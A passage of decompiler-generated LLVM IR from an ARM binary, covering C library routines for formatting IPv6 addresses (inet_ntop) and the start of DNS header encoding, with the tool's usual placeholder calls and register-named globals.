  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 2, 3, 4, 5, 7, 0 }
  uselistorder i8 10, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i8 48, { 0, 8, 9, 1, 4, 5, 6, 10, 11, 12, 13, 14, 15, 2, 3, 16, 7 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_167d8, { 1, 0 }
  uselistorder label %dec_label_pc_1677c, { 1, 0 }
  uselistorder label %dec_label_pc_16748, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_167e8 = load i32, i32* @r4, align 4
  store i32 %v3_167e8, i32* %stack_var_-32, align 4
  %v6_167e8 = load i32, i32* @r5, align 4
  %v25_167e8 = ptrtoint i32* %stack_var_-32 to i32
  %v7_167ec = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_167ec, label %dec_label_pc_16810, label %dec_label_pc_16804

dec_label_pc_16804:                               ; preds = %entry
  %v7_16804 = icmp eq i32 %arg1, 10
  br i1 %v7_16804, label %dec_label_pc_16824, label %dec_label_pc_16a24

dec_label_pc_16810:                               ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1681c = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_16a1c

dec_label_pc_16824:                               ; preds = %dec_label_pc_16804
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_16830 = bitcast i32* %stack_var_-64 to i8*
  %v3_16830 = call i32 @__GI_memset(i8* %v2_16830, i32 0)
  br label %dec_label_pc_16850

dec_label_pc_1683c:                               ; preds = %dec_label_pc_16850
  %tmp68 = icmp slt i32 %v1_16840, 0
  %v4_16850 = zext i1 %tmp68 to i32
  %v5_16850 = add i32 %v4_16850, %v1_16840
  %v3_16854 = sdiv i32 %v5_16850, 2
  %v4_16864 = mul i32 %v3_16854, 4
  %v5_16864 = add i32 %v4_16864, %v25_167e8
  %v1_1683c = add i32 %v2_16860, 1
  %v2_1683c = inttoptr i32 %v1_1683c to i8*
  %v3_1683c = load i8, i8* %v2_1683c, align 1
  %v4_1683c = zext i8 %v3_1683c to i32
  %v3_16840 = inttoptr i32 %v2_16860 to i8*
  %v4_16840 = load i8, i8* %v3_16840, align 1
  %v6_16840 = zext i8 %v4_16840 to i32
  store i32 %v6_16840, i32* %r2.global-to-local, align 4
  %v4_16844 = mul nuw nsw i32 %v6_16840, 256
  %v5_16844 = or i32 %v4_16844, %v4_1683c
  %v2_16848 = add i32 %v5_16864, -32
  %v3_16848 = inttoptr i32 %v2_16848 to i32*
  store i32 %v5_16844, i32* %v3_16848, align 4
  %v0_1684c = load i32, i32* %r1.global-to-local, align 4
  %v1_1684c = add i32 %v0_1684c, 2
  br label %dec_label_pc_16850

dec_label_pc_16850:                               ; preds = %dec_label_pc_16824, %dec_label_pc_1683c
  %v1_16840 = phi i32 [ 0, %dec_label_pc_16824 ], [ %v1_1684c, %dec_label_pc_1683c ]
  store i32 %v1_16840, i32* %r1.global-to-local, align 4
  %v0_16860 = load i32, i32* @r8, align 4
  %v2_16860 = add i32 %v0_16860, %v1_16840
  store i32 %v2_16860, i32* %r2.global-to-local, align 4
  %v7_16868 = icmp sgt i32 %v1_16840, 15
  br i1 %v7_16868, label %dec_label_pc_1686c, label %dec_label_pc_1683c

dec_label_pc_1686c:                               ; preds = %dec_label_pc_16850
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1687c

dec_label_pc_1687c:                               ; preds = %dec_label_pc_1686c, %dec_label_pc_168c8
  %v0_168bc = phi i32 [ -1, %dec_label_pc_1686c ], [ %v0_168f0, %dec_label_pc_168c8 ]
  %v0_168ac = phi i32 [ -1, %dec_label_pc_1686c ], [ %v0_168dc, %dec_label_pc_168c8 ]
  %v0_16890 = phi i32 [ -1, %dec_label_pc_1686c ], [ %v0_168908, %dec_label_pc_168c8 ]
  %v0_168c8 = phi i32 [ 0, %dec_label_pc_1686c ], [ %v1_168c8, %dec_label_pc_168c8 ]
  %v4_16880 = mul nuw nsw i32 %v0_168c8, 4
  %v5_16880 = add i32 %v4_16880, %v25_167e8
  %v1_16884 = add i32 %v5_16880, -32
  %v2_16884 = inttoptr i32 %v1_16884 to i32*
  %v3_16884 = load i32, i32* %v2_16884, align 4
  %v2_16888 = icmp eq i32 %v3_16884, 0
  %v7_16890 = icmp eq i32 %v0_16890, -1
  br i1 %v2_16888, label %dec_label_pc_16890, label %dec_label_pc_168a4

dec_label_pc_16890:                               ; preds = %dec_label_pc_1687c
  br i1 %v7_16890, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16890
  store i32 %v0_168c8, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_168c8

.thread:                                          ; preds = %dec_label_pc_16890
  %v1_1689c.pre = load i32, i32* @r4, align 4
  %v2_1689c = add i32 %v1_1689c.pre, 1
  store i32 %v2_1689c, i32* @r4, align 4
  br label %dec_label_pc_168c8

dec_label_pc_168a4:                               ; preds = %dec_label_pc_1687c
  br i1 %v7_16890, label %dec_label_pc_168c8, label %dec_label_pc_168ac

dec_label_pc_168ac:                               ; preds = %dec_label_pc_168a4
  %v7_168ac = icmp eq i32 %v0_168ac, -1
  %v0_168c0.pre = load i32, i32* @r4, align 4
  %v1_168b4 = load i32, i32* @r7, align 4
  %v7_168b8 = icmp sgt i32 %v0_168c0.pre, %v1_168b4
  %or.cond = or i1 %v7_168ac, %v7_168b8
  br i1 %or.cond, label %dec_label_pc_168bc, label %dec_label_pc_168c4

dec_label_pc_168bc:                               ; preds = %dec_label_pc_168ac
  store i32 %v0_168bc, i32* @r6, align 4
  store i32 %v0_168c0.pre, i32* @r7, align 4
  br label %dec_label_pc_168c4

dec_label_pc_168c4:                               ; preds = %dec_label_pc_168ac, %dec_label_pc_168bc
  %v0_168ac13 = phi i32 [ %v0_168bc, %dec_label_pc_168bc ], [ %v0_168ac, %dec_label_pc_168ac ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_168c8

dec_label_pc_168c8:                               ; preds = %bb, %.thread, %dec_label_pc_168a4, %dec_label_pc_168c4
  %v0_168f0 = phi i32 [ %v0_168bc, %.thread ], [ %v0_168c8, %bb ], [ %v0_168bc, %dec_label_pc_168a4 ], [ -1, %dec_label_pc_168c4 ]
  %v0_168908 = phi i32 [ %v0_16890, %.thread ], [ %v0_168c8, %bb ], [ -1, %dec_label_pc_168a4 ], [ -1, %dec_label_pc_168c4 ]
  %v0_168dc = phi i32 [ %v0_168ac, %.thread ], [ %v0_168ac, %bb ], [ %v0_168ac, %dec_label_pc_168a4 ], [ %v0_168ac13, %dec_label_pc_168c4 ]
  %v1_168c8 = add nuw nsw i32 %v0_168c8, 1
  store i32 %v1_168c8, i32* %r1.global-to-local, align 4
  %v7_168d0 = icmp slt i32 %v1_168c8, 8
  br i1 %v7_168d0, label %dec_label_pc_1687c, label %dec_label_pc_168d4

dec_label_pc_168d4:                               ; preds = %dec_label_pc_168c8
  %v7_168d4 = icmp eq i32 %v0_168f0, -1
  br i1 %v7_168d4, label %dec_label_pc_168f4, label %dec_label_pc_168dc

dec_label_pc_168dc:                               ; preds = %dec_label_pc_168d4
  %v7_168dc = icmp eq i32 %v0_168dc, -1
  %v0_168ec.pre = load i32, i32* @r4, align 4
  br i1 %v7_168dc, label %dec_label_pc_168ec, label %dec_label_pc_168e4

dec_label_pc_168e4:                               ; preds = %dec_label_pc_168dc
  %v1_168e4 = load i32, i32* @r7, align 4
  %v7_168e8 = icmp sgt i32 %v0_168ec.pre, %v1_168e4
  br i1 %v7_168e8, label %dec_label_pc_168ec, label %dec_label_pc_168f4

dec_label_pc_168ec:                               ; preds = %dec_label_pc_168dc, %dec_label_pc_168e4
  store i32 %v0_168ec.pre, i32* @r7, align 4
  store i32 %v0_168f0, i32* @r6, align 4
  br label %dec_label_pc_168f4

dec_label_pc_168f4:                               ; preds = %dec_label_pc_168e4, %dec_label_pc_168d4, %dec_label_pc_168ec
  %v0_168f4 = phi i32 [ %v0_168dc, %dec_label_pc_168e4 ], [ %v0_168dc, %dec_label_pc_168d4 ], [ %v0_168f0, %dec_label_pc_168ec ]
  %v7_168f4 = icmp eq i32 %v0_168f4, -1
  br i1 %v7_168f4, label %bb49, label %dec_label_pc_168fc

dec_label_pc_168fc:                               ; preds = %dec_label_pc_168f4
  %v0_168fc = load i32, i32* @r7, align 4
  %v7_16900 = icmp slt i32 %v0_168fc, 2
  br i1 %v7_16900, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_168fc
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_168f4, %dec_label_pc_168fc, %bb48
  %v0_1691023 = phi i32 [ %v0_168f4, %dec_label_pc_168f4 ], [ %v0_168f4, %dec_label_pc_168fc ], [ -1, %bb48 ]
  %v2_16904 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_16904, i32* @r4, align 4
  %v9_16970 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_1691063 = icmp eq i32 %v0_1691023, -1
  br label %dec_label_pc_16910

dec_label_pc_16910:                               ; preds = %bb49, %dec_label_pc_169c4
  %v7_1691067 = phi i1 [ %v7_1691063, %bb49 ], [ %v7_16910, %dec_label_pc_169c4 ]
  %v0_1693c66 = phi i32 [ 0, %bb49 ], [ %v1_169c4, %dec_label_pc_169c4 ]
  %v1_1692c65 = phi i32 [ %v0_1691023, %bb49 ], [ %v0_16910.pre, %dec_label_pc_169c4 ]
  %v3_1694464 = phi i32 [ %v2_16904, %bb49 ], [ %v3_1693424, %dec_label_pc_169c4 ]
  br i1 %v7_1691067, label %dec_label_pc_1693c, label %dec_label_pc_16918

dec_label_pc_16918:                               ; preds = %dec_label_pc_16910
  %v9_16918 = icmp eq i32 %v0_1693c66, %v1_1692c65
  %v5_1691c = icmp slt i32 %v0_1693c66, %v1_1692c65
  br i1 %v5_1691c, label %dec_label_pc_1693c, label %dec_label_pc_16920

dec_label_pc_16920:                               ; preds = %dec_label_pc_16918
  %v1_16920 = load i32, i32* @r7, align 4
  %v2_16920 = add i32 %v1_16920, %v1_1692c65
  %v6_16928 = icmp slt i32 %v0_1693c66, %v2_16920
  br i1 %v6_16928, label %dec_label_pc_1692c, label %dec_label_pc_1693c

dec_label_pc_1692c:                               ; preds = %dec_label_pc_16920
  br i1 %v9_16918, label %bb51, label %dec_label_pc_169c4

bb51:                                             ; preds = %dec_label_pc_1692c
  %v4_16934 = inttoptr i32 %v3_1694464 to i8*
  store i8 58, i8* %v4_16934, align 1
  %v5_16934 = load i32, i32* @r4, align 4
  %v6_16934 = add i32 %v5_16934, 1
  store i32 %v6_16934, i32* @r4, align 4
  br label %dec_label_pc_169c4

dec_label_pc_1693c:                               ; preds = %dec_label_pc_16920, %dec_label_pc_16918, %dec_label_pc_16910
  %v2_1693c = icmp eq i32 %v0_1693c66, 0
  br i1 %v2_1693c, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_1693c
  %v4_16944 = inttoptr i32 %v3_1694464 to i8*
  store i8 58, i8* %v4_16944, align 1
  %v5_16944 = load i32, i32* @r4, align 4
  %v6_16944 = add i32 %v5_16944, 1
  store i32 %v6_16944, i32* @r4, align 4
  %v0_16948.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1693c, %bb52
  %v0_16988 = phi i32 [ %v3_1694464, %dec_label_pc_1693c ], [ %v6_16944, %bb52 ]
  %v1_169ac = phi i32 [ 0, %dec_label_pc_1693c ], [ %v0_16948.pre, %bb52 ]
  %v7_16948 = icmp eq i32 %v1_169ac, 6
  br i1 %v7_16948, label %dec_label_pc_16950, label %dec_label_pc_169a8

dec_label_pc_16950:                               ; preds = %.thread3
  %v0_16950 = load i32, i32* @r6, align 4
  %v2_16950 = icmp eq i32 %v0_16950, 0
  br i1 %v2_16950, label %dec_label_pc_16958, label %dec_label_pc_169a8

dec_label_pc_16958:                               ; preds = %dec_label_pc_16950
  %v0_16958 = load i32, i32* @r7, align 4
  %v7_16958 = icmp eq i32 %v0_16958, 6
  br i1 %v7_16958, label %dec_label_pc_16978, label %dec_label_pc_16960

dec_label_pc_16960:                               ; preds = %dec_label_pc_16958
  %v7_16960 = icmp eq i32 %v0_16958, 5
  br i1 %v7_16960, label %dec_label_pc_16968, label %dec_label_pc_169a8

dec_label_pc_16968:                               ; preds = %dec_label_pc_16960
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_16970, label %dec_label_pc_16978, label %dec_label_pc_169a8

dec_label_pc_16978:                               ; preds = %dec_label_pc_16968, %dec_label_pc_16958
  %v2_1697c = sub i32 %v25_167e8, %v0_16988
  %v0_16980 = load i32, i32* @r8, align 4
  %v1_16980 = add i32 %v0_16980, 12
  %v1_16984 = add i32 %v2_1697c, -32
  store i32 %v1_16984, i32* %r2.global-to-local, align 4
  store i32 %v0_16988, i32* %r1.global-to-local, align 4
  %v3_1698c = call i32 @inet_ntop4(i32 %v1_16980, i32 %v0_16988, i32 %v1_16984)
  %v2_16990 = icmp eq i32 %v3_1698c, 0
  br i1 %v2_16990, label %dec_label_pc_16a1c, label %dec_label_pc_16998

dec_label_pc_16998:                               ; preds = %dec_label_pc_16978
  %v0_16998 = load i32, i32* @r4, align 4
  %v1_16998 = inttoptr i32 %v0_16998 to i8*
  %v3_1699c = call i32 @strlen(i8* %v1_16998)
  %v0_169a0 = load i32, i32* @r4, align 4
  %v2_169a0 = add i32 %v0_169a0, %v3_1699c
  store i32 %v2_169a0, i32* @r4, align 4
  %v0_169d8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_169d8

dec_label_pc_169a8:                               ; preds = %dec_label_pc_16968, %dec_label_pc_16960, %dec_label_pc_16950, %.thread3
  %v4_169ac = mul i32 %v1_169ac, 4
  %v5_169ac = add i32 %v4_169ac, %v25_167e8
  store i32 %v0_16988, i32* @r0, align 4
  %v1_169b4 = add i32 %v5_169ac, -32
  %v2_169b4 = inttoptr i32 %v1_169b4 to i32*
  %v3_169b4 = load i32, i32* %v2_169b4, align 4
  store i32 %v3_169b4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a310.639 to i32), i32* %r1.global-to-local, align 4
  %v7_169bc = call i32 @sprintf(i32 %v0_16988, i32 ptrtoint ([3 x i8]* @global_var_1a310.639 to i32), i32 %v3_169b4, i32 %v5_169ac, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_169c0 = load i32, i32* @r4, align 4
  %v2_169c0 = add i32 %v0_169c0, %v7_169bc
  store i32 %v2_169c0, i32* @r4, align 4
  br label %dec_label_pc_169c4

dec_label_pc_169c4:                               ; preds = %dec_label_pc_1692c, %bb51, %dec_label_pc_169a8
  %v3_1693424 = phi i32 [ %v3_1694464, %dec_label_pc_1692c ], [ %v6_16934, %bb51 ], [ %v2_169c0, %dec_label_pc_169a8 ]
  %v0_169c4 = load i32, i32* @r5, align 4
  %v1_169c4 = add i32 %v0_169c4, 1
  %v0_16910.pre = load i32, i32* @r6, align 4
  store i32 %v1_169c4, i32* @r5, align 4
  %v7_169cc = icmp slt i32 %v1_169c4, 8
  %v7_16910 = icmp eq i32 %v0_16910.pre, -1
  br i1 %v7_169cc, label %dec_label_pc_16910, label %dec_label_pc_169d0

dec_label_pc_169d0:                               ; preds = %dec_label_pc_169c4
  br i1 %v7_16910, label %.thread4, label %dec_label_pc_169d8

dec_label_pc_169d8:                               ; preds = %dec_label_pc_169d0, %dec_label_pc_16998
  %v3_169e4 = phi i32 [ %v3_1693424, %dec_label_pc_169d0 ], [ %v2_169a0, %dec_label_pc_16998 ]
  %v0_169d8 = phi i32 [ %v0_16910.pre, %dec_label_pc_169d0 ], [ %v0_169d8.pre, %dec_label_pc_16998 ]
  %v1_169d8 = load i32, i32* @r7, align 4
  %v2_169d8 = add i32 %v1_169d8, %v0_169d8
  %v7_169dc = icmp eq i32 %v2_169d8, 8
  br i1 %v7_169dc, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_169d8
  %v4_169e4 = inttoptr i32 %v3_169e4 to i8*
  store i8 58, i8* %v4_169e4, align 1
  %v5_169e4 = load i32, i32* @r4, align 4
  %v6_169e4 = add i32 %v5_169e4, 1
  store i32 %v6_169e4, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_169d8, %dec_label_pc_169d0, %bb53
  %v2_169ec = phi i32 [ %v3_169e4, %dec_label_pc_169d8 ], [ %v3_1693424, %dec_label_pc_169d0 ], [ %v6_169e4, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_169ec = inttoptr i32 %v2_169ec to i8*
  store i8 0, i8* %v3_169ec, align 1
  %v4_169ec = load i32, i32* @r4, align 4
  %v5_169ec = add i32 %v4_169ec, 1
  store i32 %v2_16904, i32* %r1.global-to-local, align 4
  %v2_169f4 = sub i32 %v5_169ec, %v2_16904
  %v1_169f8 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_169f4, %v1_169f8
  br i1 %tmp69, label %dec_label_pc_16a00, label %dec_label_pc_16a14

dec_label_pc_16a00:                               ; preds = %.thread4
  %v0_16a00 = call i32 @__errno_location()
  %v0_16a08 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16a08, i32* %r2.global-to-local, align 4
  %v2_16a0c = inttoptr i32 %v0_16a00 to i32*
  store i32 28, i32* %v2_16a0c, align 4
  %v0_16a34.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16a34

dec_label_pc_16a14:                               ; preds = %.thread4
  %v0_16a14 = load i32, i32* @sb, align 4
  %v2_16a18 = bitcast i32* %stack_var_-110 to i8*
  %v3_16a18 = call i32 @strcpy(i32 %v0_16a14, i8* %v2_16a18)
  br label %dec_label_pc_16a1c

dec_label_pc_16a1c:                               ; preds = %dec_label_pc_16978, %dec_label_pc_16810, %dec_label_pc_16a14
  %v0_16a1c = phi i32 [ 0, %dec_label_pc_16978 ], [ %v3_1681c, %dec_label_pc_16810 ], [ %v3_16a18, %dec_label_pc_16a14 ]
  store i32 %v0_16a1c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16a34

dec_label_pc_16a24:                               ; preds = %dec_label_pc_16804
  %v0_16a24 = call i32 @__errno_location()
  %v2_16a2c = inttoptr i32 %v0_16a24 to i32*
  store i32 97, i32* %v2_16a2c, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16a34

dec_label_pc_16a34:                               ; preds = %dec_label_pc_16a1c, %dec_label_pc_16a00, %dec_label_pc_16a24
  %v0_16a34 = phi i32 [ %v0_16a1c, %dec_label_pc_16a1c ], [ %v0_16a34.pre, %dec_label_pc_16a00 ], [ 0, %dec_label_pc_16a24 ]
  store i32 %v6_167e8, i32* %r5.global-to-local, align 4
  ret i32 %v0_16a34

; uselistorder directives
  uselistorder i1 %v7_16910, { 1, 0 }
  uselistorder i32 %v0_16910.pre, { 1, 0, 2 }
  uselistorder i32 %v1_169c4, { 1, 0, 2 }
  uselistorder i32 %v0_16988, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_1694464, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1692c65, { 2, 0, 1 }
  uselistorder i32 %v0_1693c66, { 3, 2, 0, 1 }
  uselistorder i32 %v2_16904, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1691023, { 1, 0 }
  uselistorder i32 %v0_168f4, { 1, 2, 0 }
  uselistorder i32 %v1_168c8, { 1, 2, 0 }
  uselistorder i32 %v0_168dc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_168f0, { 1, 2, 0, 3 }
  uselistorder i1 %v7_16890, { 1, 0 }
  uselistorder i32 %v0_168c8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_168ac, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_168bc, { 3, 1, 0, 2 }
  uselistorder i32 %v2_16860, { 2, 1, 0 }
  uselistorder i32 %v1_16840, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_167e8, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 6, 7, 0 }
  uselistorder i32 97, { 5, 6, 10, 0, 1, 9, 7, 2, 3, 4, 8 }
  uselistorder i32 (i32, i8*)* @strcpy, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 0, 1 }
  uselistorder i8 58, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 0, 1, 12, 14, 15, 7, 24, 22, 19, 23, 8, 2, 3, 4, 13, 5, 6, 9, 10, 11, 16, 17, 18, 20, 21 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16a34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16a1c, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_169c4, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_16910, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_168f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_168ec, { 1, 0 }
  uselistorder label %dec_label_pc_168c8, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_168c4, { 1, 0 }
  uselistorder label %dec_label_pc_1687c, { 1, 0 }
  uselistorder label %dec_label_pc_16850, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_16a4c = load i32, i32* @r4, align 4
  store i32 %v3_16a4c, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_16a5c = icmp sgt i32 %arg3, 11
  br i1 %v7_16a5c, label %dec_label_pc_16a60, label %dec_label_pc_16b28

dec_label_pc_16a60:                               ; preds = %entry
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_16a60 = add i32 %tmp, 1
  %v2_16a60 = inttoptr i32 %v1_16a60 to i8*
  %v3_16a60 = load i8, i8* %v2_16a60, align 1
  store i8 %v3_16a60, i8* %tmp18, align 1
  %v2_16a68 = load i32, i32* %arg1, align 4
  %v1_16a6c = trunc i32 %v2_16a68 to i8
  %v4_16a6c = add i32 %arg2, 1
  %v5_16a6c = inttoptr i32 %v4_16a6c to i8*
  store i8 %v1_16a6c, i8* %v5_16a6c, align 1
  %v0_16a70 = load i32, i32* %lr.global-to-local, align 4
  %v1_16a70 = add i32 %v0_16a70, 12
  %v2_16a70 = inttoptr i32 %v1_16a70 to i32*
  %v3_16a70 = load i32, i32* %v2_16a70, align 4
  %v1_16a74 = add i32 %v0_16a70, 4
  %v2_16a74 = inttoptr i32 %v1_16a74 to i32*
  %v3_16a74 = load i32, i32* %v2_16a74, align 4
  %v1_16a78 = add i32 %v0_16a70, 16
  %v2_16a78 = inttoptr i32 %v1_16a78 to i32*
  %v3_16a78 = load i32, i32* %v2_16a78, align 4
  %v1_16a7c = add i32 %tmp, 8
  %v2_16a7c = inttoptr i32 %v1_16a7c to i32*
  %v3_16a7c = load i32, i32* %v2_16a7c, align 4
  %v2_16a80 = icmp eq i32 %v3_16a70, 0
  %. = select i1 %v2_16a80, i32 0, i32 4
  %v2_16a8c = icmp eq i32 %v3_16a74, 0
  %v1_16a90 = add i32 %v0_16a70, 20
  %v2_16a90 = inttoptr i32 %v1_16a90 to i32*
  %v3_16a90 = load i32, i32* %v2_16a90, align 4
  store i32 %v3_16a90, i32* @ip, align 4
  %storemerge12 = select i1 %v2_16a8c, i32 0, i32 128
  %v1_16a9c = urem i32 %v3_16a7c, 16
  %v2_16aa0 = icmp eq i32 %v3_16a78, 0
  %.29 = select i1 %v2_16aa0, i32 0, i32 2
  %v4_16aac = mul nuw nsw i32 %v1_16a9c, 8
  %v5_16aac = or i32 %v4_16aac, %.
  %v2_16ab0 = icmp eq i32 %v3_16a90, 0
  br i1 %v2_16ab0, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_16a60
  %v2_16ab4 = or i32 %v5_16aac, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_16a60, %bb25
  %v1_16abc = phi i32 [ %v5_16aac, %dec_label_pc_16a60 ], [ %v2_16ab4, %bb25 ]
  %v2_16ab8 = or i32 %.29, %storemerge12
  %v2_16abc = or i32 %v2_16ab8, %v1_16abc
  %v1_16ac0 = trunc i32 %v2_16abc to i8
  %v2_16ac0 = load i32, i32* %r4.global-to-local, align 4
  %v3_16ac0 = add i32 %v2_16ac0, 2
  %v4_16ac0 = inttoptr i32 %v3_16ac0 to i8*
  store i8 %v1_16ac0, i8* %v4_16ac0, align 1
  %v0_16ac4 = load i32, i32* %lr.global-to-local, align 4
  %v1_16ac4 = add i32 %v0_16ac4, 24
  %v1_16ac8 = inttoptr i32 %v1_16ac4 to i32*
  %v2_16ac8 = load i32, i32* %v1_16ac8, align 4
  %v3_16ac8 = add i32 %v0_16ac4, 28
  %v4_16ac8 = inttoptr i32 %v3_16ac8 to i32*
  %v5_16ac8 = load i32, i32* %v4_16ac8, align 4
  %v2_16acc = icmp eq i32 %v2_16ac8, 0
  %v1_16ad0 = urem i32 %v5_16ac8, 16
  %.30 = select i1 %v2_16acc, i32 0, i32 128
  %v2_16adc = or i32 %v1_16ad0, %.30
  %v1_16ae0 = trunc i32 %v2_16adc to i8
  %v2_16ae0 = load i32, i32* %r4.global-to-local, align 4
  %v3_16ae0 = add i32 %v2_16ae0, 3
  %v4_16ae0 = inttoptr i32 %v3_16ae0 to i8*
  store i8 %v1_16ae0, i8* %v4_16ae0, align 1
  %v0_16ae4 = load i32, i32* %lr.global-to-local, align 4
  %v1_16ae4 = add i32 %v0_16ae4, 33
  %v2_16ae4 = inttoptr i32 %v1_16ae4 to i8*
  %v3_16ae4 = load i8, i8* %v2_16ae4, align 1
  %v2_16ae8 = load i32, i32* %r4.global-to-local, align 4
  %v3_16ae8 = add i32 %v2_16ae8, 4
  %v4_16ae8 = inttoptr i32 %v3_16ae8 to i8*
  store i8 %v3_16ae4, i8* %v4_16ae8, align 1
  %v0_16aec = load i32, i32* %lr.global-to-local, align 4
  %v1_16aec = add i32 %v0_16aec, 32
  %v2_16aec = inttoptr i32 %v1_16aec to i32*
  %v3_16aec = load i32, i32* %v2_16aec, align 4
  %v1_16af0 = trunc i32 %v3_16aec to i8
  %v2_16af0 = load i32, i32* %r4.global-to-local, align 4
  %v3_16af0 = add i32 %v2_16af0, 5
  %v4_16af0 = inttoptr i32 %v3_16af0 to i8*
  store i8 %v1_16af0, i8* %v4_16af0, align 1
  %v0_16af4 = load i32, i32* %lr.global-to-local, align 4
  %v1_16af4 = add i32 %v0_16af4, 37
  %v2_16af4 = inttoptr i32 %v1_16af4 to i8*
  %v3_16af4 = load i8, i8* %v2_16af4, align 1
  %v2_16af8 = load i32, i32* %r4.global-to-local, align 4
  %v3_16af8 = add i32 %v2_16af8, 6
  %v4_16af8 = inttoptr i32 %v3_16af8 to i8*
  store i8 %v3_16af4, i8* %v4_16af8, align 1
  %v0_16afc = load i32, i32* %lr.global-to-local, align 4
  %v1_16afc = add i32 %v0_16afc, 36
  %v2_16afc = inttoptr i32 %v1_16afc to i32*
  %v3_16afc = load i32, i32* %v2_16afc, align 4
  %v1_16b00 = trunc i32 %v3_16afc to i8
  %v2_16b00 = load i32, i32* %r4.global-to-local, align 4
  %v3_16b00 = add i32 %v2_16b00, 7
  %v4_16b00 = inttoptr i32 %v3_16b00 to i8*
  store i8 %v1_16b00, i8* %v4_16b00, align 1
  %v0_16b04 = load i32, i32* %lr.global-to-local, align 4
  %v1_16b04 = add i32 %v0_16b04, 41
  %v2_16b04 = inttoptr i32 %v1_16b04 to i8*
  %v3_16b04 = load i8, i8* %v2_16b04, align 1
  %v2_16b08 = load i32, i32* %r4.global-to-local, align 4
  %v3_16b08 = add i32 %v2_16b08, 8
  %v4_16b08 = inttoptr i32 %v3_16b08 to i8*
